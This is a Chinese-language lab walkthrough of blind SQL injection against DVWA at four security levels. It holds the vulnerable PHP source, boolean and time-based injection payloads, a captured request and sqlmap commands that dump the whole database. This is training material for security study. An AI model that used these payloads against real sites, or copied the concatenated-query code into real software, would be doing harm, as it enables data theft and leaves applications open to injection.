<center>SQL InjectionSQL盲注</center>





[toc]







## SQLInjection SQL盲注

> SQLInjection SQL盲注







### 1. low

> 低级
>
> low

```php

<?php

if( isset( $_GET[ 'Submit' ] ) ) {
    // Get input
    $id = $_GET[ 'id' ];

    // Check database
    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid ); // Removed 'or die' to suppress mysql errors

    // Get results
    $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors
    if( $num > 0 ) {
        // Feedback for end user
        echo '<pre>User ID exists in the database.</pre>';
    }
    else {
        // User wasn't found, so the page wasn't!
        header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );

        // Feedback for end user
        echo '<pre>User ID is MISSING from the database.</pre>';
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}
```

> 盲注和注入的区别，就是，`不直接显示数据了`



盲注思路：

1. 是否有注入，布尔或时间

```shell
1' or 1=1 #
#时间
1' and sleep(5) #
```

2. 获取当前数据库

```sql
获取数据库长度
1' and length(database()) = 4 #

猜解数据库名称字符
1' and ascii(substr(database(),1,1)) > 1 #
ascii 编码 查看低一个字符是否为 68

获取表名长度
1' and length(substr(select table_name from information_schema.tables where table_schema=database() limit 0,1)) > 1 #

猜解表名称字符
1' and ascii(substr(select table_name from information_schema.tables where table_schema=database() limit 0,1)) > 97 #

获取列名长度
1' and (select count(column_name) from information_schema.columns where table_name ='users') =1

猜解列名称字符
1' and length(substr((select column_name from information_schema.columns where table_name = 'users' limit 0,1),1)) = 7
```

> 盲注很难猜解，所以利用工具。

1. burp获取请求包，存放到文件

```shel
GET /vulnerabilities/sqli_blind/?id=1&Submit=Submit HTTP/1.1
Host: 192.168.0.111:8000
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.0.111:8000/vulnerabilities/sqli_blind/?id=1%27+and+ascii%28substr%28database%28%29%2C1%2C1%29%29+%3D96+%23&Submit=Submit
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8
Cookie: PHPSESSID=5skbhhtisu1kf4vfe8jvh4a2l5; security=low
Connection: keep-alive
```

2. sqlmap

```shell
# 获取数据名称 dvwa数据库
sqlmap -r 1.txt -dbs

# 获取数据 获取数据库，并解密password  牛皮。
sqlmap -r 1.txt -D dvwa -dump-all
```





### 2. medium

> 中级
>
> 代码

```php

<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $id = $_POST[ 'id' ];
    $id = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $id ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Check database
    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid ); // Removed 'or die' to suppress mysql errors

    // Get results
    $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors
    if( $num > 0 ) {
        // Feedback for end user
        echo '<pre>User ID exists in the database.</pre>';
    }
    else {
        // Feedback for end user
        echo '<pre>User ID is MISSING from the database.</pre>';
    }

    //mysql_close();
}

```

```shell
# 获取数据名称 dvwa数据库
sqlmap -r 1.txt -dbs

# 获取数据 获取数据库，并解密password  牛皮。
sqlmap -r 1.txt -D dvwa -dump-all
```







### 3. high

> 高级
>
> 代码

```php

<?php

if( isset( $_COOKIE[ 'id' ] ) ) {
    // Get input
    $id = $_COOKIE[ 'id' ];

    // Check database
    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid ); // Removed 'or die' to suppress mysql errors

    // Get results
    $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors
    if( $num > 0 ) {
        // Feedback for end user
        echo '<pre>User ID exists in the database.</pre>';
    }
    else {
        // Might sleep a random amount
        if( rand( 0, 5 ) == 3 ) {
            sleep( rand( 2, 4 ) );
        }

        // User wasn't found, so the page wasn't!
        header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );

        // Feedback for end user
        echo '<pre>User ID is MISSING from the database.</pre>';
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}
```







### 4. impossible

> 不可能的

```php
<?php

if( isset( $_GET[ 'Submit' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $id = $_GET[ 'id' ];

    // Was a number entered?
    if(is_numeric( $id )) {
        // Check the database
        $data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );
        $data->bindParam( ':id', $id, PDO::PARAM_INT );
        $data->execute();
        $row = $data->fetch();

        // Make sure only 1 result is returned
        if( $data->rowCount() == 1 ) {
            // Get values
            $first = $row[ 'first_name' ];
            $last  = $row[ 'last_name' ];

            // Feedback for end user
            echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
        }
    }
}

// Generate Anti-CSRF token
generateSessionToken();

```

